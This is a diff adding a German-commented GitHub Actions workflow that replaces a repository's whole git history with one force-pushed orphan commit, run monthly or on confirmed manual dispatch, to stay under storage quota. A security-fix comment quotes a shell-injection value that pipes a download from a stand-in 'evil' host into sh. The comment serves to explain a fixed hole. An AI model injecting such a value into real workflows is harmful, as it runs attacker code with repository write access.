@@ -1,0 +1,192 @@
+name: History Fresh Start (Git-Historie zuruecksetzen)
+
+# ============================================================================
+# ACHTUNG - BITTE VOLLSTAENDIG LESEN:
+#
+# Dieser Workflow ersetzt die KOMPLETTE Git-Historie des Repos durch einen
+# einzigen neuen Commit mit dem aktuellen Dateistand. Das ist bei JEDEM Lauf
+# (auch automatisch) ein voller History-Reset:
+#   - ALLE bisherigen Commits gehen unwiderruflich verloren
+#   - Jeder Klon des Repos muss danach NEU geklont werden
+#   - Offene Pull Requests / Forks werden ungueltig
+#   - Der AKTUELLE Dateistand selbst bleibt unveraendert - nur die
+#     Vergangenheit verschwindet
+#
+# Grund: Das Repository naehert sich wiederholt GitHubs Speicherkontingent
+# (siehe Chat-Verlauf, ~98,67 GB Stand 08.08.2026), groesstenteils durch
+# taeglich mehrfach komplett neu committete grosse Dateien wie
+# combined_threat_blacklist_ipv4_part*.txt und blacklist_confidence40_
+# ipv4_part*.txt.
+#
+# FIX AUTO-FRESH-START (2026-08-08): Laeuft jetzt zusaetzlich zum manuellen
+# Trigger auch automatisch 1x/Monat (siehe cron unten), um die History
+# proaktiv zurueckzusetzen, BEVOR die Quota wieder eng wird - statt nur
+# reaktiv nach einem bereits eingetretenen Push-Fehler. Bei einem
+# automatischen Lauf entfaellt die Text-Bestaetigung (kann bei
+# workflow_dispatch nicht eingegeben werden) - stattdessen genuegt der
+# Trigger-Typ "schedule" als Bestaetigung.
+#
+# VORAUSSETZUNG: Ein Repository-Ruleset auf dem main-Branch mit "Restrict
+# force pushes" wuerde auch diesen automatischen Lauf mit GH013 blockieren
+# (siehe Chat-Verlauf, 08.08.2026). Muss in GitHub Settings -> Rules ->
+# Rulesets VOR dem ersten automatischen Lauf angepasst werden (Bypass fuer
+# github-actions[bot] oder Regel deaktivieren) - das kann dieser Workflow
+# nicht selbst loesen.
+# ============================================================================
+
+on:
+  workflow_dispatch:
+    inputs:
+      confirm_reset:
+        description: 'Tippe exakt: HISTORIE ZURUECKSETZEN'
+        required: true
+        type: string
+  schedule:
+    # 1x monatlich, am 1. um 03:15 UTC - Zeitpunkt bewusst ausserhalb der
+    # 8x-taeglichen Combined/Confidence-Slots gewaehlt, um keine Kollision
+    # mit deren concurrency-Gruppe zu riskieren.
+    # FIX FRESHSTART-SLOT-KOLLISION 01.09.2026 (Review-Fund MITTEL):
+    # Stand vorher auf '15 3 1 * *' mit dem Kommentar, der Zeitpunkt liege
+    # "bewusst ausserhalb der 8x-taeglichen Combined/Confidence-Slots".
+    # Das war nachweislich falsch: update_combined_blacklist.yml startet
+    # '7 */3 * * *', also 03:07, mit 20-40 min realer Laufzeit und
+    # timeout-minutes: 90. Ein Force-Push auf einen Orphan-Branch um 03:15
+    # traf damit regelmaessig einen laufenden Combined-Job, dessen
+    # "Commit and Push" anschliessend gegen eine voellig neue Historie
+    # rebasen musste. Neuer Slot: 05:20 UTC - Combined laeuft 03:47-Backup
+    # und 06:07-Primaer, Confidence '47 1,4,7,...', ip_ablauf '55 */3',
+    # AFD nur sonntags 04:37/07:23/11:47. 05:20 ist in allen Rastern frei.
+    - cron: '20 5 1 * *'
+
+# FIX HEALTH-CHECK (2026-08-08): env-Block ergaenzt, analog zu den anderen
+# Haupt-Workflows im Repo (z.B. update_combined_blacklist.yml). Ohne diese
+# Variable kann es bei den in Actions-Runnern verwendeten JavaScript-
+# Actions zu Node.js-Kompatibilitaetsproblemen kommen.
+env:
+  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true
+
+permissions:
+  contents: write
+
+# Gemeinsam mit den zentralen State-Schreibern serialisieren. Weitere
+# Workflows und manuelle Pushes sind ueber die unveraenderliche Lease geschuetzt.
+concurrency:
+  group: netshield-seen-db-writers
+  cancel-in-progress: false
+
+jobs:
+  fresh-start:
+    runs-on: ubuntu-26.04
+    timeout-minutes: 20
+    steps:
+      - name: Bestaetigung pruefen
+        # FIX SEC-SHELL-INTERPOLATION 01.09.2026 (Review-Fund NIEDRIG):
+        # confirm_reset ist ein Freitext-Input und wurde direkt per
+        # ${{ ... }} in eine doppelt gequotete Shell-Zeile interpoliert.
+        # GitHub ersetzt den Ausdruck VOR der Shell-Auswertung, ein Wert wie
+        #   x"; curl http://evil/ | sh; echo "
+        # bricht damit aus dem String aus und laeuft mit contents: write und
+        # dem GITHUB_TOKEN dieses Jobs. Ausnutzbar nur fuer jemanden, der
+        # ohnehin workflow_dispatch ausloesen darf - trotzdem der falsche
+        # Weg. Der Wert kommt jetzt ueber env in die Umgebung und wird als
+        # normale Shell-Variable in Anfuehrungszeichen verglichen, wo keine
+        # Ersetzung mehr stattfindet.
+        env:
+          CONFIRM_RESET: ${{ github.event.inputs.confirm_reset }}
+          EVENT_NAME: ${{ github.event_name }}
+        run: |
+          if [ "$EVENT_NAME" = "schedule" ]; then
+            echo "Automatischer monatlicher Lauf (schedule-Trigger) - Bestaetigung durch Trigger-Typ selbst, fahre fort."
+          elif [ "$CONFIRM_RESET" != "HISTORIE ZURUECKSETZEN" ]; then
+            echo "::error::Bestaetigungstext stimmt nicht exakt ueberein. Abgebrochen, nichts wurde veraendert."
+            exit 1
+          else
+            echo "Manuelle Bestaetigung erhalten - fahre fort."
+          fi
+
+      - name: Checkout Repository (flach - nur aktueller Stand, keine Historie)
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: main
+          fetch-depth: 1
+          persist-credentials: true
+
+      - name: Reset-Basis main erfassen
+        id: reset_base
+        run: |
+          set -euo pipefail
+          expected_main=$(git rev-parse --verify HEAD)
+          echo "expected_main=$expected_main" >> "$GITHUB_OUTPUT"
+
+      - name: Groesse vor der Bereinigung
+        run: |
+          echo "Aktuelle .git-Groesse (nur der flache Checkout, nicht die volle Historie):"
+          du -sh .git || true
+
+      - name: Neuen Waisen-Branch mit aktuellem Stand erstellen
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+
+          echo "Erstelle Waisen-Branch (keine Eltern-Commits, kein Historie-Bezug)..."
+          git checkout --orphan fresh-start-tmp
+
+          echo "Fuege aktuellen Dateistand hinzu (respektiert .gitignore automatisch)..."
+          git add -A
+
+          echo "Erstelle einzigen neuen Commit..."
+          git commit -m "History Fresh Start: $(TZ=Europe/Berlin date '+%Y-%m-%d %H:%M %Z') - Historie zurueckgesetzt wegen GitHub-Speicherkontingent (Repository is above its size quota). Aktueller Dateistand unveraendert, nur Vergangenheit entfernt."
+
+      - name: Alten main-Branch ersetzen
+        run: |
+          git branch -D main 2>/dev/null || true
+          git branch -m main
+          echo "Neuer main-Branch enthaelt jetzt genau 1 Commit:"
+          git log --oneline
+
+      - name: Force-Push
+        env:
+          EXPECTED_MAIN: ${{ steps.reset_base.outputs.expected_main }}
+        run: |
+          set -euo pipefail
+          if [[ ! "${EXPECTED_MAIN:-}" =~ ^[0-9a-fA-F]{40}$ ]]; then
+            echo "::error::Gueltige Reset-Basis fehlt; Abbruch."
+            exit 1
+          fi
+          reset_head=$(git rev-parse --verify HEAD)
+          # Die Lease bleibt ueber alle Retries am urspruenglichen Checkout.
+          # Neuere Commits duerfen niemals durch einen History-Reset verschwinden.
+          for attempt in 1 2 3 4 5; do
+            if git push "--force-with-lease=refs/heads/main:$EXPECTED_MAIN" origin HEAD:refs/heads/main; then
+              echo "History-Reset erfolgreich."
+              exit 0
+            fi
+            if remote_line=$(git ls-remote --exit-code origin refs/heads/main); then
+              remote_head=${remote_line%%[[:space:]]*}
+              if [ "$remote_head" = "$reset_head" ]; then
+                echo "Reset bereits uebertragen; vorherige Antwort ging verloren."
+                exit 0
+              fi
+              if [ "$remote_head" != "$EXPECTED_MAIN" ]; then
+                echo "::error::main hat sich seit dem Checkout geaendert; neuere Commits bleiben erhalten."
+                exit 1
+              fi
+            fi
+            sleep $((attempt * 3))
+          done
+          echo "::error::History-Reset nach 5 Versuchen fehlgeschlagen."
+          exit 1
+
+      - name: Ergebnis
+        run: |
+          echo "============================================================"
+          echo "  FERTIG"
+          echo "============================================================"
+          echo "Die Git-Historie besteht jetzt nur noch aus einem einzigen Commit."
+          echo ""
+          echo "WICHTIG:"
+          echo "  - GitHub braucht teils Minuten bis Stunden, um die freigewordene"
+          echo "    Groesse intern zu erfassen (interne Garbage Collection)"
+          echo "  - Falls das Repo woanders geklont ist: dort NEU klonen, nicht pullen"
+          echo "  - Andere Branches (falls vorhanden) sind von diesem Workflow NICHT"
+          echo "    betroffen und enthalten weiterhin die alte, grosse Historie"
